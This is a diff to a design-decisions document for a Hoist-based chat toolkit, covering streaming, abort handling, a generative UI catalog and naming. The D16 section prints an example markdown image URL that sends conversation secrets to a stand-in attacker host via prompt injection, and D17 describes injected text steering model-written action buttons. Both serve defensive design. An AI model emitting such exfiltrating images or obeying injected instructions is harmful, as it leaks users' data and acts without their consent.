@@ -77,9 +77,10 @@ The translation then lives once, in tested TypeScript, rather than in each app's
 Hoist apps already have a hoist-core server, and `renderNDJSON` already pairs with
 `fetchNdjson`.
 
-**Gap.** `BaseController.renderNDJSON` buffers 32 KB before it flushes. Token streaming needs a
-flush after each line, so the Toolbox controller writes the stream itself. The report proposes a
-streaming option for hoist-core.
+**Gap.** `BaseController.renderNDJSON` flushes after the first row, then every 32 KB. Token
+streaming needs a flush after each line, so the Toolbox controller writes the stream itself. A
+streaming option for hoist-core, with a flush per line and disconnect detection, would remove
+that code from every app.
 
 ## D7. The client runs the tool loop
 
@@ -157,8 +158,9 @@ native fetch through `fetchOpts.signal`. They combine it with the turn's signal 
 `XH.fetchService.abort(key)` returns false and the body keeps streaming, so the server keeps
 generating tokens. A signal on the native fetch cancels the body too.
 
-**Cost.** `AbortSignal.any` needs a 2024-or-later browser. The report proposes a `signal` option
-for Hoist's `FetchOptions`, plus abort support for streamed responses.
+**Cost.** `AbortSignal.any` needs a 2024-or-later browser. A `signal` option on Hoist's
+`FetchOptions`, with abort support for streamed responses, would let the transports drop the
+workaround.
 
 ## D15. Generative UI is a Hoist component catalog, with protocols as translators
 
@@ -174,3 +176,65 @@ UI answers the first half. The second half needs generative UI built on Hoist's 
 charts, which are stronger than generic component kits for data-dense apps. A catalog the app
 controls keeps the model to known components and known props. XH has a proof of concept that
 renders Hoist grids and charts inline in a chat in this way, under tight constraints.
+
+**Update.** The catalog shipped in v1, as designed here: `ChatUiCatalog` in `genui/`, with the
+built-in grid, chart, metrics and card in `desktop/cmp/genui/`. Each component is an inline
+client tool, so streaming, validation and errors reuse the tool machinery. `ChatUiAdapter` is
+the seam for A2UI and OpenUI. The kit ships the interface, and no adapter.
+
+## D16. Markdown images do not load by default
+
+**Decision.** `ChatMarkdown` does not load markdown images unless `allowImages` permits them.
+A blocked image renders as a link, labeled with its alt text, that the user can choose to open.
+An app allows images with `true`, or with a function that decides by source URL. `ChatPanel`
+and `ChatMessageList` pass the setting through.
+
+**Why.** An image sends a request to its URL the moment it renders, with no action by the user.
+A prompt injection in a web page, a document or a tool result can tell the model to write an
+image whose URL holds data from the conversation, such as
+`![](https://attacker.example/?d=<secret>)`. The request then sends that data to the attacker's
+server. Published attacks on LLM chat products have used this channel. A link needs a click,
+so the user sees the URL first.
+
+**Cost.** A model that draws charts or diagrams as markdown images shows links until the app
+allows its image host. Apps that show trusted images should allow their own URLs with a
+function, not all images with `true`.
+
+**Alternatives.** Strip images entirely, with `disallowedElements`. That hides the alt text,
+and the user cannot tell that the reply had an image.
+
+## D17. A card action shows exactly what it sends
+
+**Decision.** The built-in card's follow-up actions send their `prompt` as the user's own
+message. The button's tooltip shows the prompt before the click, and the chat shows it as the
+user's message after it. A prompt is at most 200 characters.
+
+**Why.** The model writes both the button text and the prompt. The threat is the one in D16: a
+prompt injection in a web page, a document or a tool result can steer what the model writes. It
+could label a button "Show trades" and make its prompt an instruction the user never meant to give.
+One example tells an agent to send data somewhere. A click then sends that instruction with the
+user's authority. If the user sees the whole prompt before and after the click, the button cannot
+claim one thing and send another unseen. The length cap keeps the whole prompt readable in a
+tooltip, and leaves no room to hide a long instruction behind a short one.
+
+**Cost.** A model cannot attach hidden context to an action. It writes the prompt as the user
+would say it, and keeps any detail it needs in the conversation.
+
+**Alternatives.** Put the prompt in the composer for the user to send. That adds a step to every
+action, and the user still has to read the prompt. Show only the tooltip. A user who does not
+hover would not see the prompt before it goes.
+
+## D18. Generative UI names carry the `ChatUi` prefix
+
+**Decision.** Every public generative UI name starts with `ChatUi` or `chatUi`. Types are
+`ChatUiCatalog`, `ChatUiComponentSpec`, `ChatUiGridSpecProps` and `ChatUiGridSpecOptions`.
+Components are `ChatUiGrid` and its factory `chatUiGrid`. The functions that return catalog
+specs are `chatUiGridSpec()`, `chatUiChartSpec()`, `chatUiMetricsSpec()` and `chatUiCardSpec()`.
+
+**Why.** D10 gives kit names a prefix, so that they never collide with app or Hoist names. A
+bare `gridComponent()` or `GridComponentProps` would sit beside an app's own grid code. The
+`Spec` suffix says what the function returns, a `ChatUiComponentSpec`, and pairs it with the
+component it renders.
+
+**Alternatives.** `chatGridComponent()` and the like. It reads well alone, but adds a third
+naming scheme beside `ChatUiGrid` and `ChatUiComponentSpec`, and hides that the result is a spec.
